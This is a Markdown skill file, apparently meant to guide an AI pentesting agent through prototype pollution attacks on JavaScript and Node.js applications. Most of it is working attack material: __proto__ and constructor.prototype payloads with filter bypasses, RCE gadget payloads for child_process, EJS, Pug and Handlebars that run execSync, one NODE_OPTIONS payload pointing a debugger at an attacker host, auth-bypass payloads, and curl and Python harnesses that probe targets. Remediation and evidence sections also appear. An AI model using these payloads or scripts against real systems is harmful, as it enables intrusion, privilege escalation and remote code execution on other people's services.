---
name: attack-prototype-pollution
description: "Prototype pollution — __proto__ injection, client-side and server-side gadget chains, RCE paths"
category: "web-application"
version: "1.1"
author: "cyberstrike-official"
tags:
  - prototype-pollution
  - javascript
  - nodejs
  - rce
  - attack
tech_stack:
  - nodejs
  - javascript
  - web
cwe_ids:
  - CWE-1321
  - CWE-915
chains_with:
  - attack-xss
  - attack-ssti
prerequisites: []
severity_boost:
  attack-xss: "Client-side pollution plus a DOM gadget = XSS with no HTML injection"
  attack-ssti: "Server-side pollution reaching a template option = RCE"
---

# Prototype Pollution

> **AI LOAD INSTRUCTION**: Prototype pollution is **not** a finding on its own. Injecting
> `__proto__` into an object proves that a merge happened; it does not prove impact. The
> finding requires a **gadget** — a piece of application or library code that reads a
> polluted property and does something dangerous with it (executes a command, sets an option,
> writes a file, escapes a sandbox).
>
> So the discipline is two-stage: **stage one** is proving the pollution reaches
> `Object.prototype`; **stage two** is finding the gadget. Most testers stop at stage one and
> report a low-severity informational, or worse, claim RCE without a gadget.
>
> Split the two contexts carefully, because they are different bugs:
> **client-side pollution** leads to XSS through DOM gadgets, and **server-side pollution**
> leads to RCE through Node.js option-injection gadgets. Test both where both apply — JSON
> APIs are usually server-side, and merge functions in a browser bundle are client-side.

## 0. RELATED ROUTING

- [prototype-pollution](../prototype-pollution/SKILL.md) — the long-form companion; load alongside this file
- [prototype-pollution-advanced](../prototype-pollution-advanced/SKILL.md) — gadget chains in depth
- [xss-cross-site-scripting](../xss-cross-site-scripting/SKILL.md) — the usual client-side outcome
- [attack-ssti](../attack-ssti/SKILL.md) — an RCE route via polluted template options
- [cmdi-command-injection](../cmdi-command-injection/SKILL.md) — what a server-side gadget achieves
- [security-reporting-and-documentation](../security-reporting-and-documentation/SKILL.md) — proving the gadget, not just the merge

---

## 1. PROVING THE POLLUTION — STAGE ONE

You need an input that reaches a recursive merge, a `set` on a path, or a query-string parser
that recurses.

**The canonical JSON payloads:**

```json
{"__proto__": {"polluted": "yes"}}
{"constructor": {"prototype": {"polluted": "yes"}}}
{"__proto__": {"isAdmin": true}}
```

**The `constructor.prototype` variant exists because `__proto__` is frequently blocked while
the constructor path is not.** Always send both — they reach the same place through different
keys.

**Query-string and form variants** — many parsers build nested objects from bracketed keys:

```text
?__proto__[polluted]=yes
?constructor[prototype][polluted]=yes
?__proto__.polluted=yes
?__proto__=&__proto__[polluted]=yes
```

**Confirmation methods, in order of reliability:**

| Method | How |
|---|---|
| **reflected property** | the app echoes an object; your polluted key appears |
| **behaviour change** | a default that should be absent is now present |
| **client-side check** | in a browser console after the pollution: `({}).polluted` → `"yes"` |
| **server-side check** | a subsequent request behaves differently |
| **timing/error oracle** | a polluted option causes an error or a delay |

**Client-side confirmation is trivial and definitive.** Open the console on the target page,
trigger the polluting request, then evaluate:

```javascript
({}).polluted          // → "yes"  means Object.prototype is polluted
Object.prototype.polluted
```

**Server-side confirmation is harder** because you cannot read the object graph. Use an
observable side effect: pollute a property the application reads for a decision
(`isAdmin`, `role`, `status`) and observe whether the decision changes.

**Blocked-key bypasses** — when `__proto__` is filtered, reach the same target:

```json
{"constructor": {"prototype": {"polluted": "yes"}}}
{"__pro__proto__to__": {"polluted": "yes"}}       // depends on the sanitiser
{"p\u0072oto__": {"polluted": "yes"}}              // unicode escape
{"__proto__ ": {"polluted": "yes"}}                // trailing space, if trimmed late
["__proto__"]: {"polluted": "yes"}                 // array-notation parsers
```

**Also test null-prototype objects.** A merge that skips `__proto__` entirely can still be
polluted via `constructor.prototype`, which is why both payloads are mandatory.

---

## 2. CLIENT-SIDE EXPLOITATION — DOM GADGETS

Once `Object.prototype` is polluted in the victim's browser, any code that reads a property
from a missing key gets your value. The gadget is the code that turns that into XSS.

**Gadget classes to look for:**

| Gadget | Mechanism |
|---|---|
| script `src` construction | `script.src = config.url \|\| defaults.url` |
| jQuery / library option defaults | `.extend(true, {}, defaults, user)` then `$(el).html(opts.html)` |
| `innerHTML` from a config object | `el.innerHTML = cfg.template` |
| `document.write` from options | a library that reads a missing option |
| `setAttribute` with a polluted name | attribute injection |
| `eval`/`Function` with a polluted default | direct execution |
| fetch/axios default base URL | requests redirected to the attacker |
| sanitizer configuration | **DOMPurify's `ALLOWED_ATTR` — poisoning it permits `onerror`** |
| `allowScripts` / `allowedTags` flags | disabling sanitisation from a polluted default |

**The DOM-invariance technique** (search for gadgets systematically):

1. Load the page, capture a hash of the DOM.
2. Pollute `Object.prototype` with a set of candidate property names.
3. Reload and re-hash.
4. Any changed property name is a **gadget candidate** — it is being read somewhere.

Automate the candidate list from the JS bundle: extract every property name accessed on an
option or config object, and test them in batches. A change in behaviour identifies the gadget
without reading minified code.

**The sanitizer gadget is the highest-value client-side target.** If DOMPurify or a similar
library is configured from a polluted default, the pollution disables the sanitisation that
would otherwise block the XSS — turning a hardening control into the vulnerability.

**Then chain to a real sink.** The gadget must ultimately reach `innerHTML`, `eval`, or a
`script` element. Report the full chain: pollution → gadget → sink → execution.

---

## 3. SERVER-SIDE EXPLOITATION — RCE GADGETS

Node.js passes option objects to child processes, file operations, and template engines.
Polluting those options is how prototype pollution becomes RCE.

**The standard RCE gadget families:**

| Library / API | Gadget | Effect |
|---|---|---|
| `child_process.spawn` / `execFile` | `shell`, `argv0`, `env`, `NODE_OPTIONS` | command execution |
| `child_process.fork` | `execArgv` | code execution via Node flags |
| `child_process.exec` | `shell` option | choose the shell binary |
| template engines (EJS, Pug, Handlebars) | `outputFunctionName`, `client`, `escapeFunction` | code injection into generated JS |
| `fs` operations | `encoding`, `mode` | file write behaviour — chained |
| `axios` / HTTP clients | `baseURL` | SSRF, credential forwarding |
| `mysql` / DB clients | `host`, `user`, `password` | connection redirection |

**Concrete payloads:**

```json
{"__proto__": {"shell": "/bin/sh", "NODE_OPTIONS": "--require /proc/self/environ"}}
{"__proto__": {"argv0": "console.log(require('child_process').execSync('id').toString())//"}}
{"__proto__": {"NODE_OPTIONS": "--inspect=attacker:9999"}}
{"__proto__": {"execArgv": ["--eval=require('child_process').execSync('id')"]}}
{"__proto__": {"outputFunctionName": "x;process.mainModule.require('child_process').execSync('id');s"}}
```

**The `NODE_OPTIONS` route** is the most reliable modern gadget: Node reads the environment
for `NODE_OPTIONS` when spawning a child, and a polluted `env` object supplies it.

**The EJS `outputFunctionName` gadget** injects directly into the generated template
function — a well-known chain from pollution to RCE.

**You must confirm the gadget exists in the target's dependency tree.** Check the versions from
the response headers, the JS bundle (for the client side), an exposed `package.json`, or the
error pages. **Do not claim RCE from a payload that assumes `child_process` is reachable without
confirming it.**

---

## 4. CHAINING

Prototype pollution is most often an amplifier, not the finding itself.

| Chain | Mechanism |
|---|---|
| pollution → DOM gadget → XSS | client-side execution with no HTML injection needed |
| pollution → authz check | globally set `isAdmin`, `role`, or `verified` |
| pollution → SSRF | poison `baseURL` or a URL default; internal requests follow |
| pollution → RCE | option injection into `child_process` or a template engine |
| pollution → DoS | poison a property read in a hot path; null dereference crashes the process |
| pollution → bypass a sanitiser | poison the allowlist, then deliver the payload it should have blocked |

**The authorization chain is the one most testers miss, and it is the easiest to prove.**
Pollute `isAdmin` or `role`, then make a request that checks it. If the check reads from a
missing property on an object rather than an explicit field, it is bypassed globally for that
process — and sometimes for every subsequent user, because the pollution is global state.

**That global scope is what makes server-side pollution severe:** a single request can alter
the application's behaviour for all users until the process restarts. Verify this by testing
whether a *second*, unrelated session sees the polluted behaviour.

---

## 5. WHAT CONSTITUTES A FINDING

| Finding | Severity | Proof required |
|---|---|---|
| Pollution reaching RCE, demonstrated with command output | **Critical (P1)** | the payload, the gadget, and the command output |
| Pollution to XSS via a DOM gadget, executing in a browser | **High–Critical (P1/P2)** | the chain and a browser PoC |
| Pollution bypassing an authorization decision | **High–Critical (P1/P2)** | the polluted flag and the resulting access |
| Pollution affecting other users' requests | **High (P2)** | the polluted behaviour in a separate session |
| Pollution to SSRF via a default URL | **High (P2)** | the internal request made |
| Pollution confirmed, no gadget found | **Low (P4)** | the pollution proof and a note that no gadget was identified |
| Input rejected or sanitised | **Not a finding** | document the negative result |

**"Polluted but no gadget" is a low finding, honestly reported.** Inflating it to RCE by
assuming an unexploited gadget exists is the most common error in this class.

---

## 6. EVIDENCE STANDARD

| Item | Why |
|---|---|
| the exact polluting request | the input |
| proof the pollution landed — the reflected property or the console check | stage one |
| **the gadget identified, by name and location** | stage two — the part that makes it a finding |
| the library and version containing the gadget | proves the chain is real, not theoretical |
| the observable effect, with output where available | command output, altered DOM, bypassed check |
| for a global effect: the same behaviour in a **second, unrelated session** | proves process-wide scope |
| for a browser chain: the PoC page and a screenshot of execution | proves client-side impact |
| a **control**: the same request without `__proto__` | proves the pollution caused the effect |

**Name the gadget explicitly.** "Prototype pollution in the JSON merge endpoint, gadget
`NODE_OPTIONS` in `child_process.spawn`, leading to command execution" is a complete finding.
"Prototype pollution possible" is not.

**False positives to exclude:**

| Looks like pollution | Actually |
|---|---|
| your key appears in the echoed response | reflection, but check whether it is on `Object.prototype` |
| the pollution is local to your own object | own-property assignment, not pollution |
| you assume a gadget exists in a library you did not verify | theoretical, not a finding |
| the effect does not reproduce in a fresh session | may be a per-request artefact |
| a `400` on the `__proto__` payload | the parser rejected it |
| the client-side check was polluted in your own console only | proves the sink, not the server |
| pollution succeeded but nothing reads the property | low, no gadget |

---

## 7. REMEDIATION REFERENCE

1. **Reject `__proto__` and `constructor`/`prototype` keys in all input** — at the parser boundary. Do not rely on the merge function to be safe; block the keys before they reach it.
2. **Create objects with `Object.create(null)`** — a null-prototype object has no `Object.prototype` to pollute, and this eliminates the entire class for that code path.
3. **Use `Object.freeze(Object.prototype)` at startup** — the strongest single control for server-side Node.js. It prevents any write to the prototype, including from third-party libraries.
4. **Use `Map` for user-keyed data** — `Map` has no prototype chain and no string-key collision surface. Prefer it over plain objects for anything derived from input.
5. **Implement safe merge and path-set helpers** — reject `__proto__`, `constructor`, and `prototype` at every traversal level; do not merely skip the key at the top level, since nested traversal re-enters them.
6. **Never pass a request-derived object directly as options** — construct option objects explicitly from named, validated fields. Option injection is what turns pollution into RCE.
7. **Keep dependencies patched** — most real-world pollution CVEs are in merge and parsing libraries (`lodash`, `minimist`, `qs`, `jquery`). Track advisories for anything that merges input.
8. **Sanitise on the client too** — the same merge patterns exist in bundled front-end code; a polluted `Object.prototype` in the browser is the client-side half of the same bug.
9. **Test the pollution and the gadget separately in CI** — a test asserting `({}).polluted === undefined` after each parsing path catches regressions cheaply, and a gadget inventory keeps the impact assessment current.

---

## 8. CONFIRMING THE FINDING

| Step | Question | What it proves |
|---|---|---|
| 1 | Did `Object.prototype` end up **actually polluted**, read back in a fresh context? | the pollution happened |
| 2 | Was there a **control** - the same request with a benign key, which pollutes nothing? | the merge caused it |
| 3 | Did the pollution reach a **sink that changes behaviour** (auth, a gadget, a template)? | the impact |
| 4 | Did you pollute via **`__proto__`, `constructor.prototype`, or a parser-specific form**? | the vector and the fix |
| 5 | Did the polluted property **survive** into another request or another user's context? | the scope |
| 6 | Did it reach **remote code execution** through a documented gadget chain? | the severity step-up |
| 7 | Did you **restore or restart** the process you polluted? | engagement integrity |

**A read-back showing `({}).polluted === "yes"` in the target's own context is the bar.** A payload that
was accepted by the server is a candidate; the polluted prototype read back is the finding.

---

## 9. EXECUTION PRIMITIVES

Prototype pollution is proven by **a payload that pollutes `Object.prototype` and a read-back that shows
it, with the benign-key control and a sink that behaves differently**. Every block ends at a read-back.

### 9.1 The three write forms and the control

```bash
T="https://target.example"
# control: a benign key, which must change nothing
curl -sS -X POST "$T/api/settings" -H 'Content-Type: application/json' \
  -d '{"theme":{"colour":"blue"}}' -w '\ncontrol %{http_code}\n'
# form 1: __proto__
curl -sS -X POST "$T/api/settings" -H 'Content-Type: application/json' \
  -d '{"__proto__":{"polluted":"yes"}}' -w '\npollute1 %{http_code}\n'
# form 2: constructor.prototype, which bypasses a check that only filters __proto__
curl -sS -X POST "$T/api/settings" -H 'Content-Type: application/json' \
  -d '{"constructor":{"prototype":{"polluted":"yes"}}}' -w '\npollute2 %{http_code}\n'
# form 3: the QUERY-STRING parser, which is a different code path from the JSON parser
curl -sS -X POST "$T/api/settings" -d '__proto__[polluted]=yes' -w '\npollute3 %{http_code}\n'
curl -sS -X POST "$T/api/settings" -d 'constructor[prototype][polluted]=yes' -w '\npollute4 %{http_code}\n'
# THE READ-BACK: an endpoint that returns a fresh object, which is where the pollution shows
curl -sS "$T/api/settings" | head -c 300; echo
curl -sS "$T/api/debug/object" | head -c 300; echo
echo "-> the read-back is the finding. A 200 on the write is NOT."
```

**The read-back is the finding.** A `200` on the write only means the server accepted JSON; the polluted
prototype has to be observable in a response.

### 9.2 The read-back techniques, for when there is no obvious endpoint

```python
# when no endpoint returns a fresh object, use a DIFFERENTIAL: pollute a property the app already reads
# and look for a behaviour change. Each of these is a read-back channel.
import requests
T = "https://target.example"

CHANNELS = {
 # 1) a property the framework reads with a default -> changing it changes the response
 "toJSON":      {"__proto__": {"toJSON": "polluted"}},
 # 2) the status/error fields a framework reads
 "status":      {"__proto__": {"status": 500}},
 "statusCode":  {"__proto__": {"statusCode": 500}},
 # 3) a template's variable resolution
 "escape":      {"__proto__": {"escapeFunction": "x"}},
 # 4) a header-value lookup
 "headers":     {"__proto__": {"headers": {"x-polluted": "yes"}}},
 # 5) the OPTIONS/JSON response shape
 "json spaces": {"__proto__": {"json spaces": 10}},
 "exposed":     {"__proto__": {"exposed": True}},
}
print("%-14s %-6s %-9s %s" % ("channel","code","bytes","changed vs baseline?"))
base = requests.get(f"{T}/api/settings", timeout=10)
for name, payload in CHANNELS.items():
    requests.post(f"{T}/api/settings", json=payload, timeout=10)
    r = requests.get(f"{T}/api/settings", timeout=10)
    diff = "YES" if (r.status_code, len(r.content)) != (base.status_code, len(base.content)) else "no"
    print("%-14s %-6s %-9s %s" % (name, r.status_code, len(r.content), diff))
print()
print("a DIFFERENTIAL is a read-back: the property was merged into the prototype and the app read it.")
print("a per-request read-back that must be done in a FRESH request, because the pollution is global")
```

**A differential is a valid read-back.** Any observable behaviour change after the merge proves the
prototype was modified, and the fresh-request requirement is what makes it global rather than local.

### 9.3 The query-string and multipart parsers, which differ from JSON

```bash
T="https://target.example"
# the query-string parsers in qs, express, and body-parser have different quirks
for P in '__proto__[polluted]=yes' '__proto__.polluted=yes' 'constructor[prototype][polluted]=yes' \
         '__pro__proto__to__[polluted]=yes' '%5f%5fproto%5f%5f[polluted]=yes' \
         '__proto__[polluted]=yes&__proto__[polluted]=yes' \
         'a[__proto__][polluted]=yes' 'a[constructor][prototype][polluted]=yes'; do
  printf '%-52s ' "$P"
  curl -sS -o /dev/null -w '%{http_code}\n' "$T/api/settings?$P"
done
# and the multipart form, which some multipart parsers treat as a nested object
curl -sS -X POST "$T/api/upload" -F '__proto__[polluted]=yes' -o /dev/null -w 'multipart %{http_code}\n'
# and the JSON with an array, which some deep-merge implementations handle differently
curl -sS -X POST "$T/api/settings" -H 'Content-Type: application/json' \
  -d '{"a":[],"__proto__":{"polluted":"yes"}}' -o /dev/null -w 'json-array %{http_code}\n'
curl -sS -X POST "$T/api/settings" -H 'Content-Type: application/json' \
  -d '[{"__proto__":{"polluted":"yes"}}]' -o /dev/null -w 'json-root-array %{http_code}\n'
```

**Each parser has its own bypass set.** A JSON-only test misses the query-string path entirely, and the
report should say which parsers you tested.

### 9.4 The gadget chains, which turn pollution into impact

```python
# a polluted prototype on its own is low severity. The GADGET is what makes it a real finding.
GADGETS = {
 "child_process (Node)": {
   "pollute": '{"__proto__":{"shell":"node","argv0":"node","NODE_OPTIONS":"--require /proc/self/environ","env":{"EVIL":"console.log(require(\'child_process\').execSync(\'id\').toString())"}}}',
   "note":   "a polluted env/shell/argv0 reaches spawn() wherever the app calls it with defaults",
 },
 "EJS template": {
   "pollute": '{"__proto__":{"outputFunctionName":"x;process.mainModule.require(\'child_process\').execSync(\'id\');s"}}',
   "note":   "EJS before 3.1.7 compiles outputFunctionName into the template body",
 },
 "Pug template": {
   "pollute": '{"__proto__":{"block":"{process.mainModule.require(\'child_process\').execSync(\'id\')}"}}',
   "note":   "the pug block/compileDebug gadgets",
 },
 "Handlebars": {
   "pollute": '{"__proto__":{"pending":"{{#with (lookup this \'constructor\')}}{{this}}{{/with}}"}}',
   "note":   "the handlebars compile/escapeExpression gadget family",
 },
 "Express / body-parser": {
   "pollute": '{"__proto__":{"status":500}}',
   "note":   "a polluted status/headers field changes the framework's own response handling",
 },
 "Lodash merge": {
   "pollute": '{"__proto__":{"polluted":"yes"}}',
   "note":   "the sink itself; confirm the version, since 4.17.12 and later block it",
 },
 "Auth bypass": {
   "pollute": '{"__proto__":{"isAdmin":true,"role":"admin","verified":true}}',
   "note":   "the highest-yield gadget: a polluted default permission on an object that lacks the key",
 },
}
for name, g in GADGETS.items():
    print(f"== {name}")
    print(f"   pollute: {g['pollute'][:130]}")
    print(f"   why:     {g['note']}")
print()
print("THE ORDER: auth-bypass gadget first (cheap, safe, high signal), then a template gadget,")
print("then child_process. Report the GADGET, not the pollution - pollution alone is a low finding.")
```

**The auth-bypass gadget is the highest-yield and the safest.** `isAdmin` or `role` merged into
`Object.prototype` changes every object that lacks the key, and it is one request to test.

### 9.5 The end-to-end harness

```bash
python3 - <<'PY'
import requests, json
T = "https://target.example"; S = requests.Session()

def probe(tag, payload, from_qs=False):
    if from_qs:
        r = S.post(f"{T}/api/settings", data=payload, timeout=10)
    else:
        r = S.post(f"{T}/api/settings", json=payload, timeout=10)
    nxt = S.get(f"{T}/api/settings", timeout=10)
    return r.status_code, nxt.status_code, len(nxt.content), nxt.text[:110].replace("\n"," ")

print("%-18s %-6s %-9s %s" % ("case","write","read","read-body"))
CASES = [
 ("control-benign",   {"theme": {"colour": "blue"}}, False),
 ("proto-json",       {"__proto__": {"polluted": "yes"}}, False),
 ("proto-constructor",{"constructor": {"prototype": {"polluted": "yes"}}}, False),
 ("proto-qs",         "__proto__[polluted]=yes", True),
 ("proto-admin",      {"__proto__": {"isAdmin": True, "role": "admin"}}, False),
]
base = S.get(f"{T}/api/settings", timeout=10)
print("%-18s %-6s %-9s %s" % ("BASELINE", "-", len(base.content), base.text[:110].replace("\n"," ")))
for name, payload, qs in CASES:
    w, rc, n, body = probe(name, payload, qs)
    print("%-18s %-6s %-9s %s" % (name, w, n, body))
print()
print("=== THE AUTH-BYPASS GADGET ===")
r = S.get(f"{T}/admin", timeout=10, allow_redirects=False)
print("  GET /admin after polluting isAdmin ->", r.status_code, r.headers.get("Location",""))
print("  "^"".ljust(2), "a 200 (rather than 401/302) after the pollution is the impact")
print()
print("FINDING = a read-back showing a changed object, or an auth/behaviour change after the merge,")
print("          with the benign-key control unchanged.")
print("CLEANUP  = restart the process or remove the property; state which, and when.")
PY
```

**A read-back plus a behaviour change, with the benign control.** Pollution with no observable
consequence is a low-severity note, and the report should label it as one.

---

## 10. EVIDENCE STANDARD — POLLUTION ARTEFACTS

| Item | Why |
|---|---|
| The **benign-key control result** | proves the merge target caused it |
| The **polluting payload and the parser it used** | reproducibility |
| The **read-back** showing the changed object or behaviour | the pollution, proven |
| The **gadget chain used**, with its sink | converts a low-severity merge into the real finding |
| The **auth or behaviour change** (a `200` on `/admin`, a changed response shape) | the impact |
| Whether the pollution **persisted across requests and users** | the scope |
| The **framework and library versions** (Lodash, EJS, Pug, Express) | whether the gadget applies |
| The **parser paths tested** (JSON, query string, multipart) | the coverage claim |
| The **cleanup**: the restart or the removal, and the verification | engagement integrity |
| Confirmation that **no production process was left polluted** | the operational risk |

Report the **read-back and the gadget**: "`POST /api/settings` with `{"theme":{"colour":"blue"}}` leaves
`GET /api/settings` unchanged, which is the control. The same request with
`{"__proto__":{"polluted":"yes"}}` returns `200`, and a subsequent `GET /api/settings` in a fresh request
returns a JSON body containing `"polluted":"yes"` on an object that never received the key, which is the
read-back. `{"__proto__":{"isAdmin":true,"role":"admin"}}` then made `GET /admin` return `200` with the
administrative page instead of the `302` to `/login` it returned before, which is the impact; the same
payload sent as `application/x-www-form-urlencoded` with `__proto__[polluted]=yes` also polluted, which
shows the query-string parser has the same defect. The application's package manifest pins
`lodash@4.17.15`, which is before the fix", never "the application allows prototype pollution".

### False positives - do not report these

| Observation | Why it is not a finding |
|---|---|
| A `200` on the polluting request, with **no read-back** | the server accepted JSON; nothing was merged into a prototype |
| A property set on **the object you sent**, not on the prototype | that is normal property assignment |
| A **response body echoing** your `__proto__` key | reflection, not pollution |
| A pollution demonstrated **only in a local Node REPL** | tests your environment, not the target |
| A pollution that **did not survive the request** | local to your request object, so no shared impact |
| A gadget you **read about** but did not execute | an untested hypothesis |
| A **client-side** prototype pollution in the victim's browser only | a different class; report it as XSS-adjacent |
| A differential explained by a **random or time-varying response** | verify with the benign control and a repeat |
| A finding on a **Lodash version that already blocks** the merge | verify the version before claiming the gadget |
| A pollution that required **an admin-only endpoint** | prove the privilege was not already required |
| A finding where **the process was left polluted** and you did not say so | an unreported operational risk |

**A read-back plus a gadget, with the benign control.** Accepted payloads and echoed keys are the two
ways this family produces non-findings.

---

## 11. REMEDIATION REFERENCE — MERGE HARDENING

1. **Reject `__proto__`, `constructor`, and `prototype` as keys at every input boundary, recursively and after decoding** - it addresses the entire write surface, and the check must run on the parsed structure rather than the raw string.
2. **Use `Object.create(null)` for any object built from user input, or a `Map`, so it has no prototype to pollute** - it removes the target of the attack.
3. **Prefer a `structuredClone` or an explicit schema-based parse over a deep merge for user input** - a merge is the sink, and removing it removes the defect.
4. **Apply `Object.freeze(Object.prototype)` at startup in Node applications, or run with `--disable-proto=throw`** - it converts a successful pollution into a crash, which is detectable and harmless.
5. **Keep the deep-merge library patched; Lodash 4.17.12 and later reject the `__proto__` key, and the same fix has landed across the ecosystem** - the version is frequently the whole story.
6. **Audit the application for the gadget patterns: `options` objects passed to `spawn`, template `outputFunctionName`/`block`, and any framework option read with a default** - the gadget decides the severity.
7. **Do not read an authorization decision from a property that could be inherited; use `Object.hasOwn` or an explicit allowlist** - the auth-bypass gadget depends on an inherited default.
8. **Validate and type-check the input before merging, and never merge an arbitrary JSON body into an existing object** - a schema with `additionalProperties: false` removes the key surface.
9. **Restrict the query-string parser's depth and array notation, and disable the `allowPrototypes` option where the parser offers it** - the query-string path has its own settings.
10. **Log the request body of any merge endpoint and alert on `__proto__`, `constructor`, or `prototype` appearing in it** - the attack is trivially detectable and it is a single string match.
11. **Add a startup and per-request assertion that `({}).polluted === undefined` for a sentinel key, and alert on failure** - it detects a successful pollution in production without needing to have predicted the gadget.

---

## 12. RELATED SIBLINGS - LOAD TOGETHER

- [prototype-pollution](../prototype-pollution/SKILL.md) - the full technique reference
- [prototype-pollution-advanced](../prototype-pollution-advanced/SKILL.md) - the gadget chains and the parser bypasses in depth
- [type-juggling](../type-juggling/SKILL.md) - the other JavaScript-specific trust defect
- [deserialization-insecure](../deserialization-insecure/SKILL.md) - the sibling sink that also turns an input into a gadget
- [xss-cross-site-scripting](../xss-cross-site-scripting/SKILL.md) - the client-side variant's destination
